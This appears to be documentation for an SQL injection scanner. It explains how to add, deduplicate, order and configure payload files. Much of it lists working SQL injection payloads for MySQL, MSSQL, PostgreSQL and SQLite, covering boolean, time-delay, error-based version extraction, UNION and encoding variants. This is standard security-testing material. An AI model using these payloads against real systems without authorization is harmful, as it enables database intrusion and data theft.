# Payload Management Guide

## Overview
This guide explains how to effectively manage and add new SQL injection payloads to the scanner.

## Quick Start: Adding New Payloads

### 1. Simple Addition
Just add one payload per line to the appropriate file:

```bash
# Navigate to payloads directory
cd payloads

# Add to boolean_payloads.txt
echo "' OR 'x'='x" >> boolean_payloads.txt
echo "' AND 'x'='x" >> boolean_payloads.txt

# Add to time_payloads.txt  
echo "' AND SLEEP(7)--" >> time_payloads.txt
echo "' AND BENCHMARK(10000000,MD5('a'))--" >> time_payloads.txt

# Add to error_payloads.txt
echo "' AND 1=CAST(@@version AS int)--" >> error_payloads.txt

# Add to union_payloads.txt
echo "' UNION SELECT 1,2,3,4,5,6--" >> union_payloads.txt
```

### 2. Bulk Import
Create a file with your payloads and append:

```bash
# Create custom_payloads.txt with your payloads
cat custom_mysql_payloads.txt >> payloads/boolean_payloads.txt
```

### 3. Organize with Comments
Use `#` for comments (they'll be automatically ignored):

```
# ===========================================
# MySQL Boolean-Based Payloads
# ===========================================

# Basic true/false tests
' OR '1'='1
' OR '1'='2

# ===========================================  
# Advanced conditional tests
# ===========================================

' AND (SELECT COUNT(*) FROM users)>0--
' AND EXISTS(SELECT 1 FROM information_schema.tables)--
```

## Features & Benefits

### ✅ Automatic Deduplication
The script automatically removes duplicate payloads, so don't worry about adding the same payload twice!

**Before:**
```
' OR 1=1--
' AND 1=1--
' OR 1=1--    ← Duplicate
' AND 1=2--
' OR 1=1--    ← Duplicate
```

**After Processing:**
```
' OR 1=1--
' AND 1=1--
' AND 1=2--
```

### ✅ Smart Ordering
Payloads are automatically ordered from simple to complex:

**Your file (any order):**
```
' AND (SELECT COUNT(*) FROM (SELECT 1)a JOIN (SELECT 2)b)>0--
' OR 1=1--
' AND BENCHMARK(5000000,MD5('test'))--
' OR '1'='1
```

**Script processes as:**
```
1. ' OR 1=1--                                              (simple)
2. ' OR '1'='1                                             (simple)
3. ' AND BENCHMARK(5000000,MD5('test'))--                  (medium)
4. ' AND (SELECT COUNT(*) FROM (SELECT 1)a JOIN ...)--     (complex)
```

### ✅ Normalization
Whitespace is automatically cleaned:

**Your input:**
```
'    OR     '1'='1
'  AND   1=1--
```

**Normalized:**
```
' OR '1'='1
' AND 1=1--
```

### ✅ No Limits by Default
Unlike the old version (50 payload limit), now **ALL payloads** from your files are used by default!

```python
# config.py
MAX_PAYLOADS_PER_TEST = None  # Uses ALL payloads
# Or set a specific limit:
MAX_PAYLOADS_PER_TEST = 100   # Uses first 100 after deduplication
```

## Advanced Techniques

### Database-Specific Testing

Organize payloads by database type for targeted testing:

**MySQL Payloads:**
```
# MySQL-specific functions
' AND SLEEP(5)--
' OR SLEEP(5)--
' AND BENCHMARK(5000000,MD5('test'))--
' AND ExtractValue(0,CONCAT(0x5c,@@version))--
' AND UpdateXML(0,CONCAT(0x5c,@@version),0)--
```

**MSSQL Payloads:**
```
# MSSQL-specific functions
' AND WAITFOR DELAY '0:0:5'--
' OR WAITFOR DELAY '0:0:5'--
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT db_name()))--
```

**PostgreSQL Payloads:**
```
# PostgreSQL-specific functions
' AND pg_sleep(5)--
' OR pg_sleep(5)--
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_user) AS int)--
```

### Payload Variations

Test different quote and comment styles:

```
# Single quote variations
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1;--

# Double quote variations
" OR 1=1--
" OR "1"="1
" OR "1"="1"--

# Parenthesis variations
') OR ('1'='1
')) OR (('1'='1
') OR 1=1--
```

### Encoding Variations

Add URL-encoded or hex-encoded payloads:

```
# Standard
' OR 1=1--

# URL encoded
%27%20OR%201=1--

# Hex encoded (MySQL)
' OR 0x313d31--

# Unicode variations
' OR '1'='1
′ OR ′1′=′1
```

## Configuration Guide

### Basic Settings

```python
# config.py

# Use all payloads from files
MAX_PAYLOADS_PER_TEST = None

# Limit to specific number (after deduplication)
MAX_PAYLOADS_PER_TEST = 150

# Skip duplicate payloads (recommended)
SKIP_DUPLICATE_PAYLOADS = True

# Normalize whitespace (recommended)
NORMALIZE_PAYLOADS = True

# Order payloads intelligently (recommended)
SMART_PAYLOAD_ORDERING = True
```

### Detection Tuning

```python
# Lower threshold = more sensitive (more false positives)
# Higher threshold = less sensitive (may miss vulnerabilities)

BOOLEAN_DIFFERENCE_THRESHOLD = 0.2  # 20% response difference
TIME_DELAY_THRESHOLD = 3            # 3 seconds minimum delay
```

## Best Practices

### 1. Test Your Payloads
Before adding many payloads, test a few manually to ensure they work.

### 2. Categorize Properly
Put payloads in the correct file:
- **boolean_payloads.txt**: True/false condition tests
- **time_payloads.txt**: Delay-based tests  
- **error_payloads.txt**: Error message generation
- **union_payloads.txt**: UNION SELECT tests

### 3. Document Your Payloads
Use comments to explain complex payloads:

```
# This payload attempts to extract database version via error
' AND 1=CONVERT(int,(SELECT @@version))--

# This payload tests for table existence
' AND EXISTS(SELECT 1 FROM users)--
```

### 4. Start Simple, Go Complex
Order your payloads from simple to complex in the file for better efficiency.

### 5. Remove Ineffective Payloads
If certain payloads never work, remove them to speed up scans.

## Example Workflow

### Adding Payloads for a New Database

1. **Research the database's SQL syntax**
2. **Create test payloads**
3. **Add to appropriate files with comments**

```bash
# Example: Adding SQLite payloads

# For boolean_payloads.txt
echo "# SQLite Boolean Tests" >> payloads/boolean_payloads.txt
echo "' OR '1'='1" >> payloads/boolean_payloads.txt
echo "' AND ROWID>0--" >> payloads/boolean_payloads.txt

# For time_payloads.txt  
echo "# SQLite Time Tests" >> payloads/time_payloads.txt
echo "' AND randomblob(100000000)--" >> payloads/time_payloads.txt

# For error_payloads.txt
echo "# SQLite Error Tests" >> payloads/error_payloads.txt
echo "' AND CAST('abc' AS INTEGER)--" >> payloads/error_payloads.txt
```

4. **Run a test scan**
5. **Review results and refine**

## Troubleshooting

### Payloads Not Working?

**Check file encoding:**
```bash
file payloads/boolean_payloads.txt
# Should be: UTF-8 Unicode text
```

**Check for hidden characters:**
```bash
cat -A payloads/boolean_payloads.txt
# Look for unexpected characters
```

**Verify payload count:**
```python
# Add debug output in engine
print(f"   Loaded {len(payloads)} unique payloads")
```

### Too Many Payloads?

Limit them in config.py:
```python
MAX_PAYLOADS_PER_TEST = 50  # Only use first 50
```

Or create filtered payload files:
```bash
# Keep only MySQL payloads
grep -i "sleep\|benchmark" payloads/time_payloads.txt > payloads/time_mysql.txt
```

## Performance Tips

1. **Use MAX_PAYLOADS_PER_TEST** to limit scan time
2. **Enable SKIP_DUPLICATE_PAYLOADS** (default: True)
3. **Remove ineffective payloads** after testing
4. **Order payloads by effectiveness** in your files
5. **Test against known vulnerable targets** first

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

**Remember**: Always test responsibly and only on systems you have permission to test!
